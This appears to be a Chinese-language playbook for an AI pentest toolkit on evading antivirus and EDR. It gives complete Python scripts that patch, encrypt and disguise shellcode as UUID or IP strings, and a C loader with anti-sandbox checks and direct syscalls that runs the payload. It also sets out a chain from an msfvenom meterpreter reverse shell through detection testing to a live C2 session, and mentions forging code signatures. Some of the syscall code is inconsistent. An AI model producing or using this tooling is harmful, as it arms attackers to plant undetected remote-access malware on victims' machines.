# AI 驱动免杀：Shellcode 处理 + Loader 编写

## 场景

需要生成免杀 payload，绕过 Windows Defender、火绒、360、卡巴斯基等主流杀软和 EDR 的静态/动态检测。

## 输入信号

- 需要生成免杀的可执行 payload
- msfvenom / Cobalt Strike 生成的 shellcode 被杀软标记
- 需要在授权渗透测试中落地执行
- 需要绕过特定杀软或 EDR

## 免杀全链路

```
原始 shellcode ──→ [1] Patch ──→ [2] Encrypt ──→ [3] Obfuscate ──→ [4] Loader ──→ .exe
                     │               │               │                  │
                     │               │               │                  ├─ VEH 异常处理
                     │               │               │                  ├─ Direct Syscall
                     │               │               │                  ├─ 反沙箱检测
                     │               │               │                  └─ 字符串加密
                     │               │               │
                     ▼               ▼               ▼
                 同义指令替换      XOR/RC4/AES     UUID/IPv4/MAC 伪装
                 花指令注入        多层加密         分块存储
                 指令重排          动态密钥         动态拼接
```

---

## 1. Shellcode Patch — 破坏静态特征

```python
# scripts/windows/av-evasion/shellcode-patch.py
"""
对 shellcode 做同义指令替换 + NOP  sled 插入，破坏杀软特征码匹配。
"""
import sys, random, struct

# x64 同义替换表: (原始指令字节, 替换指令字节)
X64_SYNONYMS = {
    b'\x48\x31\xc0': b'\x48\x33\xc0\x90',   # xor rax,rax → xor rax,rax; nop
    b'\x48\x31\xd2': b'\x48\x33\xd2\x90',   # xor rdx,rdx
    b'\x48\x31\xc9': b'\x48\x33\xc9\x90',   # xor rcx,rcx
    b'\x48\x31\xdb': b'\x48\x33\xdb\x90',   # xor rbx,rbx
    b'\x48\x31\xf6': b'\x48\x33\xf6\x90',   # xor rsi,rsi
    b'\x48\x31\xff': b'\x48\x33\xff\x90',   # xor rdi,rdi
    b'\x65\x48\x8b': b'\x64\x48\x8b',        # gs: → fs: (罕见杀软检测 gs)
}

# 花指令垃圾字节
JUNK_CHUNKS = [
    b'\x90',                                  # NOP
    b'\x90\x90',                              # NOP; NOP
    b'\x48\x87\xc0\x48\x87\xc0',              # xchg rax,rax; xchg rax,rax
    b'\x48\xff\xc0\x48\xff\xc8',              # inc rax; dec rax
    b'\x50\x58',                              # push rax; pop rax
    b'\xEB\x00',                              # jmp $+2 (no-op jump)
]


def patch_synonyms(data: bytes) -> bytes:
    """扫描并替换已知特征指令"""
    for orig, repl in X64_SYNONYMS.items():
        data = data.replace(orig, repl)
    return data


def inject_junk(data: bytes, density: float = 0.02) -> bytes:
    """
    按 density 比例随机插入花指令。
    只在不用作跳转目标的指令间插入(NOP sled 安全位置)。
    """
    result = bytearray()
    i = 0
    while i < len(data):
        result.append(data[i])
        # 遇到 call/jmp/ret 后不插入，避免破坏跳转目标
        if data[i] in (0xE8, 0xE9, 0xC3, 0xC2, 0xEB, 0xFF, 0x0F):
            pass
        elif random.random() < density:
            junk = random.choice(JUNK_CHUNKS)
            result.extend(junk)
        i += 1
    return bytes(result)


def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <shellcode.bin> [density=0.02]")
        sys.exit(1)

    in_file = sys.argv[1]
    density = float(sys.argv[2]) if len(sys.argv) > 2 else 0.02

    with open(in_file, 'rb') as f:
        data = f.read()

    print(f"[*] Input:  {len(data)} bytes")
    data = patch_synonyms(data)
    print(f"[*] After synonym patch: {len(data)} bytes")
    data = inject_junk(data, density)
    print(f"[*] After junk injection (density={density}): {len(data)} bytes")

    out_file = in_file.replace('.bin', '_patched.bin')
    with open(out_file, 'wb') as f:
        f.write(data)
    print(f"[+] Output: {out_file}")


if __name__ == '__main__':
    main()
```

---

## 2. Shellcode 加密 — 对抗静态扫描

```python
# scripts/windows/av-evasion/shellcode-encrypt.py
"""
多层加密 shellcode, 输出 C 数组。
支持: XOR / RC4 / 自定义 S-Box
"""
import sys, os, random, hashlib


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    """RC4 流加密"""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    result = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(result)


def custom_sbox_encrypt(data: bytes, sbox: bytes) -> bytes:
    """自定义 S-Box 替换加密"""
    result = bytearray()
    for i, b in enumerate(data):
        result.append(sbox[b] ^ sbox[i % len(sbox)])
    return bytes(result)


def generate_sbox(seed: bytes) -> bytes:
    """基于种子生成 256 字节 S-Box"""
    sbox = list(range(256))
    random.Random(hashlib.sha256(seed).digest()).shuffle(sbox)
    return bytes(sbox)


def to_c_array(data: bytes, name: str = "shellcode") -> str:
    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_str = ', '.join(f'0x{b:02x}' for b in chunk)
        lines.append(f'    {hex_str},')
    body = '\n'.join(lines)
    return (
        f'// {len(data)} bytes, encrypted\n'
        f'unsigned char {name}[] = {{\n{body}\n}};\n'
        f'unsigned int {name}_len = {len(data)};\n'
    )


def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <shellcode.bin> [key] [--layers xor,rc4,sbox]")
        print(f"       python {sys.argv[0]} <shellcode.bin> mykey --layers xor,rc4")
        sys.exit(1)

    in_file = sys.argv[1]
    key_str = sys.argv[2] if len(sys.argv) > 2 else os.urandom(16).hex()
    layers_str = sys.argv[sys.argv.index('--layers') + 1] if '--layers' in sys.argv else 'xor,rc4'

    key = key_str.encode() if not all(c in '0123456789abcdef' for c in key_str) else bytes.fromhex(key_str)
    layers = [l.strip() for l in layers_str.split(',')]

    with open(in_file, 'rb') as f:
        data = f.read()

    print(f"[*] Input:  {len(data)} bytes")
    print(f"[*] Key:    {key.hex() if isinstance(key, bytes) else key}")
    print(f"[*] Layers: {', '.join(layers)}")

    for layer in layers:
        if layer == 'xor':
            data = xor_encrypt(data, key)
            print(f"    XOR   → {len(data)} bytes")
        elif layer == 'rc4':
            data = rc4_encrypt(data, key)
            print(f"    RC4   → {len(data)} bytes")
        elif layer == 'sbox':
            sbox = generate_sbox(key)
            data = custom_sbox_encrypt(data, sbox)
            # 保存 sbox 以供 Loader 使用
            sbox_file = in_file.replace('.bin', '_sbox.bin')
            with open(sbox_file, 'wb') as f:
                f.write(sbox)
            print(f"    S-Box → {len(data)} bytes (sbox saved to {sbox_file})")
        else:
            print(f"    Unknown layer: {layer}, skipping")

    # 输出 C 数组
    out_file = in_file.replace('.bin', '_encrypted.c')
    c_code = to_c_array(data)
    with open(out_file, 'w') as f:
        f.write(c_code)
    print(f"[+] Output: {out_file}")

    # 同时输出解密密钥 C 代码
    key_file = in_file.replace('.bin', '_key.c')
    key_code = to_c_array(key, 'decrypt_key')
    with open(key_file, 'w') as f:
        f.write(key_code)
    print(f"[+] Key:    {key_file}")


if __name__ == '__main__':
    main()
```

---

## 3. Shellcode 混淆 — 伪装数据类型

```python
# scripts/windows/av-evasion/shellcode-obfuscate.py
"""
将 shellcode 伪装成 UUID / IPv4 / IPv6 / MAC 地址数组。
"""
import sys, uuid, struct, ipaddress


def to_uuid_array(data: bytes) -> list[str]:
    """16 字节一组伪装成 UUID 字符串"""
    uuids = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        if len(chunk) < 16:
            chunk = chunk + b'\x00' * (16 - len(chunk))
        uuids.append(str(uuid.UUID(bytes_le=chunk)))
    return uuids


def to_ipv4_array(data: bytes) -> list[str]:
    """4 字节一组伪装成 IPv4 地址"""
    ips = []
    for i in range(0, len(data), 4):
        chunk = data[i:i+4]
        if len(chunk) < 4:
            chunk = chunk + b'\x00' * (4 - len(chunk))
        ips.append(str(ipaddress.IPv4Address(chunk)))
    return ips


def to_ipv6_array(data: bytes) -> list[str]:
    """16 字节一组伪装成 IPv6 地址"""
    ips = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        if len(chunk) < 16:
            chunk = chunk + b'\x00' * (16 - len(chunk))
        ips.append(str(ipaddress.IPv6Address(chunk)))
    return ips


def to_mac_array(data: bytes) -> list[str]:
    """6 字节一组伪装成 MAC 地址"""
    macs = []
    for i in range(0, len(data), 6):
        chunk = data[i:i+6]
        if len(chunk) < 6:
            chunk = chunk + b'\x00' * (6 - len(chunk))
        macs.append(':'.join(f'{b:02x}' for b in chunk).upper())
    return macs


FORMATS = {
    'uuid':  (to_uuid_array,  'char*', 'UuidDeobfuscate'),
    'ipv4':  (to_ipv4_array,  'char*', 'Ipv4Deobfuscate'),
    'ipv6':  (to_ipv6_array,  'char*', 'Ipv6Deobfuscate'),
    'mac':   (to_mac_array,   'char*', 'MacDeobfuscate'),
    # Combo: 多种格式混合, 每种随机选
    'combo': (None,           'char*', 'ComboDeobfuscate'),
}


def to_c_array(items: list[str], name: str = "obfuscated") -> str:
    body = '\n'.join(f'    "{item}",' for item in items)
    return (
        f'// {len(items)} items\n'
        f'char* {name}[] = {{\n{body}\n}};\n'
        f'unsigned int {name}_count = {len(items)};\n'
    )


def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <shellcode.bin> [format=uuid|ipv4|ipv6|mac|combo]")
        sys.exit(1)

    in_file = sys.argv[1]
    fmt = sys.argv[2] if len(sys.argv) > 2 else 'uuid'

    with open(in_file, 'rb') as f:
        data = f.read()

    print(f"[*] Input:  {len(data)} bytes")
    print(f"[*] Format: {fmt}")

    if fmt == 'combo':
        # 混合格式: 随机选 UUID/IPv4/MAC
        combiners = {'uuid': to_uuid_array, 'ipv4': to_ipv4_array, 'mac': to_mac_array}
        all_items = []
        pos = 0
        while pos < len(data):
            f_choice = random.choice(list(combiners.keys()))
            chunk_sizes = {'uuid': 16, 'ipv4': 4, 'mac': 6}
            size = chunk_sizes[f_choice]
            chunk = data[pos:pos+size]
            if len(chunk) < size:
                chunk = chunk + b'\x00' * (size - len(chunk))
            fn = combiners[f_choice]
            items = fn(chunk)
            all_items.extend(items)
            pos += size
        result_fn = 'to_combo_array'
    else:
        fn, _, _ = FORMATS.get(fmt, FORMATS['uuid'])
        all_items = fn(data)
        result_fn = f'to_{fmt}_array'

    c_code = to_c_array(all_items, f'payload_{fmt}')
    out_file = in_file.replace('.bin', f'_obfuscated_{fmt}.c')
    with open(out_file, 'w') as f:
        f.write(c_code)
    print(f"[+] Output: {out_file}")


if __name__ == '__main__':
    import random
    main()
```

---

## 4. Loader 模板 — 运行时执行

```c
// scripts/windows/av-evasion/loader.c
// 编译: x86_64-w64-mingw32-gcc -o loader.exe loader.c -mwindows -Os -static -s
//  或:    cl.exe /MT /O2 /GS- loader.c /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

// ═══════════════════════════════════════════
// 0. 字符串运行时解密 (对抗静态字符串提取)
// ═══════════════════════════════════════════

#define STR_XOR_KEY 0xAB

static char* decrypt_str(char* enc, size_t len) {
    for (size_t i = 0; i < len; i++) enc[i] ^= STR_XOR_KEY;
    return enc;
}

// ═══════════════════════════════════════════
// 1. 反沙箱 / 反虚拟机检测
// ═══════════════════════════════════════════

static BOOL anti_sandbox_check(void) {
    // 方法1: 延迟执行 (沙箱通常有超时限制)
    LARGE_INTEGER delay;
    delay.QuadPart = -((LONGLONG)30000000);  // 3 seconds in 100ns units
    NtDelayExecution(FALSE, &delay);  // 或 Sleep(3000)

    // 方法2: 检测物理内存 (沙箱通常 < 2GB)
    MEMORYSTATUSEX mem = { .dwLength = sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;

    // 方法3: 检测 CPU 核心数 (沙箱通常 <= 1)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors <= 1) return TRUE;

    // 方法4: 检测已知沙箱文件/进程
    const char* sandbox_files[] = {
        "C:\\agent\\agent.pyw",
        "C:\\analysis\\analysis.exe",
        "C:\\sandbox\\",
        NULL
    };
    for (int i = 0; sandbox_files[i]; i++) {
        if (GetFileAttributesA(sandbox_files[i]) != INVALID_FILE_ATTRIBUTES)
            return TRUE;
    }

    // 方法5: 检测调试器
    if (IsDebuggerPresent()) return TRUE;

    // 方法6: 检测已知沙箱 DLL
    const char* sandbox_dlls[] = {
        "sbiedll.dll",     // Sandboxie
        "dbghelp.dll",     // 某些沙箱
        "api_log.dll",     // Sunbelt
        "dir_watch.dll",   // Sunbelt
        "pstorec.dll",     // Sunbelt
        "vmcheck.dll",     // CWSandbox
        "wpespy.dll",      // CWSandbox
        NULL
    };
    for (int i = 0; sandbox_dlls[i]; i++) {
        if (GetModuleHandleA(sandbox_dlls[i])) return TRUE;
    }

    return FALSE;
}

// ═══════════════════════════════════════════
// 2. VEH 内存保护
// ═══════════════════════════════════════════

static LONG WINAPI veh_handler(PEXCEPTION_POINTERS ex) {
    PEXCEPTION_RECORD rec = ex->ExceptionRecord;
    if (rec->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        // 按需修改内存权限
        DWORD old;
        VirtualProtect(rec->ExceptionAddress, 0x1000, PAGE_EXECUTE_READWRITE, &old);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    if (rec->ExceptionCode == EXCEPTION_ILLEGAL_INSTRUCTION) {
        // 某些杀软会插入 int3, 跳过
        ex->ContextRecord->Rip++;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// ═══════════════════════════════════════════
// 3. Direct Syscall Stubs
// ═══════════════════════════════════════════

// 从 ntdll.dll 动态提取 syscall 号 (避免硬编码)
static DWORD get_syscall_number(const char* func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    BYTE* func = (BYTE*)GetProcAddress(ntdll, func_name);
    if (!func || func[0] != 0x4C || func[1] != 0x8B || func[2] != 0xD1)  // mov r10, rcx
        return 0;
    // 找 mov eax, <syscall#>  →  B8 XX XX XX XX
    for (int i = 0; i < 24; i++) {
        if (func[i] == 0xB8) {
            return *(DWORD*)(func + i + 1);
        }
    }
    // Fallback: 找 mov eax, imm16 → B8 XX XX
    for (int i = 0; i < 24; i++) {
        if (func[i] == 0xB8) return *(WORD*)(func + i + 1);
    }
    return 0;
}

// 通用 syscall 封装
// extern 声明使函数不被内联, 保留原始汇编
extern NTSTATUS do_syscall(DWORD syscall_num, ULONG_PTR arg1, ULONG_PTR arg2,
                           ULONG_PTR arg3, ULONG_PTR arg4);

#if defined(_MSC_VER)
__declspec(naked) NTSTATUS do_syscall(DWORD syscall_num, ULONG_PTR a1, ULONG_PTR a2,
                                      ULONG_PTR a3, ULONG_PTR a4) {
    __asm {
        mov     r10, rcx
        mov     eax, edx      // syscall number
        mov     rcx, r8       // real arg1
        mov     rdx, r9       // real arg2
        mov     r8,  [rsp+40] // real arg3
        mov     r9,  [rsp+48] // real arg4
        syscall
        ret
    }
}
#elif defined(__GNUC__)
// MinGW 用内联汇编
__attribute__((naked)) NTSTATUS do_syscall(DWORD num, ULONG_PTR a1, ULONG_PTR a2,
                                            ULONG_PTR a3, ULONG_PTR a4) {
    __asm__ volatile(
        "mov %%rcx, %%r10\n\t"
        "mov %%edx, %%eax\n\t"
        "mov %%r8,  %%rcx\n\t"
        "mov %%r9,  %%rdx\n\t"
        "mov 0x28(%%rsp), %%r8\n\t"
        "mov 0x30(%%rsp), %%r9\n\t"
        "syscall\n\t"
        "ret"
    );
}
#endif

// ═══════════════════════════════════════════
// 4. Shellcode 解密 (XOR, 输入时已加密)
// ═══════════════════════════════════════════

static void xor_decrypt(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {
    for (size_t i = 0; i < len; i++) data[i] ^= key[i % key_len];
}

// ═══════════════════════════════════════════
// 5. UUID 反混淆 → 还原 shellcode 字节
// ═══════════════════════════════════════════

#include <rpc.h>
#pragma comment(lib, "rpcrt4.lib")

static void uuid_deobfuscate(char** uuids, size_t count, unsigned char* out, size_t out_len) {
    size_t offset = 0;
    for (size_t i = 0; i < count && offset < out_len; i++) {
        UUID uuid;
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], &uuid);
        if (status != RPC_S_OK) continue;
        size_t copy_len = 16;
        if (offset + copy_len > out_len) copy_len = out_len - offset;
        // UUID 按小端序存储
        memcpy(out + offset, &uuid, copy_len);
        offset += copy_len;
    }
}

// ═══════════════════════════════════════════
// 6. 主执行逻辑
// ═══════════════════════════════════════════

int main(void) {
    // ── 反沙箱 ──
    if (anti_sandbox_check()) {
        // 伪装成正常退出
        return 0;
    }

    // ── 注册 VEH ──
    AddVectoredExceptionHandler(1, veh_handler);

    // ── 加密的 shellcode (由 shellcode-encrypt.py 生成) ──
    // $$SHELLCODE_PLACEHOLDER$$

    // ── 解密密钥 (由 shellcode-encrypt.py 生成) ──
    // $$KEY_PLACEHOLDER$$

    // ── 解密 ──
    xor_decrypt(encrypted_shellcode, encrypted_shellcode_len,
                decrypt_key, decrypt_key_len);

    // ── 反混淆 (如果用了 UUID) ──
    // $$UUID_PLACEHOLDER$$
    // unsigned char deobfuscated[4096];
    // uuid_deobfuscate(payload_uuid, payload_uuid_count, deobfuscated, sizeof(deobfuscated));
    // xor_decrypt(deobfuscated, sizeof(deobfuscated), decrypt_key, decrypt_key_len);

    // ── 分配可执行内存 (用 syscall 绕过 Hook) ──
    DWORD nt_alloc = get_syscall_number("NtAllocateVirtualMemory");
    DWORD nt_write = get_syscall_number("NtWriteVirtualMemory");
    DWORD nt_protect = get_syscall_number("NtProtectVirtualMemory");
    DWORD nt_thread = get_syscall_number("NtCreateThreadEx");
    DWORD nt_wait = get_syscall_number("NtWaitForSingleObject");

    if (!nt_alloc || !nt_write || !nt_thread) {
        // Fallback: 用标准 API
        void* exec = VirtualAlloc(NULL, encrypted_shellcode_len,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        memcpy(exec, encrypted_shellcode, encrypted_shellcode_len);
        DWORD old;
        VirtualProtect(exec, encrypted_shellcode_len, PAGE_EXECUTE_READ, &old);
        HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec,
                                     NULL, 0, NULL);
        WaitForSingleObject(thread, INFINITE);
        CloseHandle(thread);
        return 0;
    }

    // ── Syscall 路径 ──
    void* exec_mem = NULL;
    SIZE_T size = encrypted_shellcode_len;
    do_syscall(nt_alloc, (ULONG_PTR)GetCurrentProcess(),
               (ULONG_PTR)&exec_mem, 0, (ULONG_PTR)&size,
               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    SIZE_T written;
    do_syscall(nt_write, (ULONG_PTR)GetCurrentProcess(),
               (ULONG_PTR)exec_mem, (ULONG_PTR)encrypted_shellcode,
               encrypted_shellcode_len, (ULONG_PTR)&written);

    // ── 改内存为可执行 ──
    DWORD old_protect;
    do_syscall(nt_protect, (ULONG_PTR)GetCurrentProcess(),
               (ULONG_PTR)&exec_mem, (ULONG_PTR)&size,
               PAGE_EXECUTE_READ, (ULONG_PTR)&old_protect);

    // ── 创建线程执行 ──
    HANDLE thread;
    do_syscall(nt_thread, (ULONG_PTR)&thread, 0x1FFFFF, 0,
               (ULONG_PTR)GetCurrentProcess(), (ULONG_PTR)exec_mem,
               0, 0, 0, 0, 0);

    do_syscall(nt_wait, (ULONG_PTR)thread, 0, 0, 0);

    CloseHandle(thread);
    return 0;
}
```

---

## 攻击链

```
[1] 生成原始 shellcode
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o payload.bin

[2] Patch 破坏静态特征
    python scripts/windows/av-evasion/shellcode-patch.py payload.bin 0.03

[3] 多层加密
    python scripts/windows/av-evasion/shellcode-encrypt.py payload_patched.bin $(openssl rand -hex 16) --layers xor,rc4

[4] 混淆伪装
    python scripts/windows/av-evasion/shellcode-obfuscate.py payload_patched_encrypted.bin combo

[5] 注入 Loader 并编译
    python scripts/windows/av-evasion/merge_loader.py payload_patched_encrypted.c payload_patched_encrypted_key.c -o loader_final.c
    x86_64-w64-mingw32-gcc -o payload.exe loader_final.c -mwindows -Os -static -s -lrpcrt4

[6] 验证
    上传 VirusTotal (勾选 private)
    本地虚拟机 (WD + 火绒 + 360) 实际执行测试
```

---

## 编译命令参考

| 编译器 | 命令 |
|--------|------|
| MinGW | `x86_64-w64-mingw32-gcc -o out.exe loader.c -mwindows -Os -static -s -lrpcrt4` |
| MSVC | `cl.exe /MT /O2 /GS- /GL loader.c /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup rpcrt4.lib` |
| Clang | `clang -target x86_64-w64-mingw32 -o out.exe loader.c -mwindows -Os -static -s -lrpcrt4` |

关键编译选项：

| 选项 | 作用 |
|------|------|
| `-mwindows` / `/SUBSYSTEM:WINDOWS` | 无控制台窗口 |
| `-Os` / `/O2` | 优化体积/速度，破坏调试符号 |
| `-static` / `/MT` | 静态链接 CRT，避免 DLL 依赖 |
| `-s` | Strip 符号表 |
| `-fvisibility=hidden` | 隐藏 ELF 符号 (非 PE) |
| `/GS-` | 禁用安全检查 (/GS 的反向，降低特征) |

---

## 免杀效果增强

### 代码层面
- **变量名随机化**：每次生成替换所有变量名为随机字符串
- **控制流平坦化**：用 switch-case + indirect jump 替代直连逻辑流
- **字符串全加密**：`"ntdll.dll"` 等敏感字符串用 XOR 存储，运行时解密
- **API 哈希调用**：用 djb2 / crc32 哈希查找 API 地址，而非明文 `GetProcAddress`

### 二进制层面
- **资源文件**：添加合法图标/UAC manifest/版本信息，伪装正常程序
- **数字签名伪造**：从合法文件复制 Authenticode 签名区
- **节区合并**：`.text` 和 `.rdata` 合并，减少节数量

---

## 证据与验证闭环

每步完成标准：

| 步骤 | 验证方法 | 通过标准 |
|------|---------|---------|
| Patch | `strings payload_patched.bin \| grep -c <特征字符串>` | 特征字符串减少 >50% |
| Encrypt | `python -c "print(all(b != 0xfc for b in open('payload_encrypted.bin','rb').read()))"` | 无原始 msfvenom stub 特征 (0xfc 等) |
| Obfuscate | 检查生成的 `.c` 文件无可直接 grep 到的 shellcode 字节 | 杀软静态扫描不报毒 |
| 编译 | `hash_file` 每次生成 hash 不同 | 两次编译同一源码 hash 不同 |
| 免杀 | VT+本地杀软实机测试 | WD/火绒/360 不报毒, VT ≤5 检出 |
| 执行 | 沙箱中实际运行, 确认 C2 上线 | msfconsole 收到 session |

## MCP 工具映射

| 步骤 | MCP 工具 | 说明 |
|------|---------|------|
| 生成 shellcode | `run_ctf_tool "msfvenom ..."` | 或直接调 msfvenom |
| 分析原始 PE 结构 | `triage_pe` | 获取节区/导入表 |
| Patch 字节 | `patch_pe_bytes` | 修改 shellcode 中已知特征字节 |
| 静态分析 Loader | `ghidra_headless_analyze` | 验证 Loader 没有明显特征 |
| 提取 IOC | `extract_iocs_from_summary` | 提取编译后 PE 的 IOC |
| Hash 验证 | `hash_file` | 验证每次生成的 hash 不同 |
| YARA 自检 | `make_yara_stub` | 对自己生成的 PE 写 YARA 规则自检 |

## 文档元信息

- **状态**: draft
- **复审轮次**: 1
- **覆盖**: shellcode 全生命周期 (生成→处理→加载→执行)
- **武器化**: 是 (仅限授权测试)
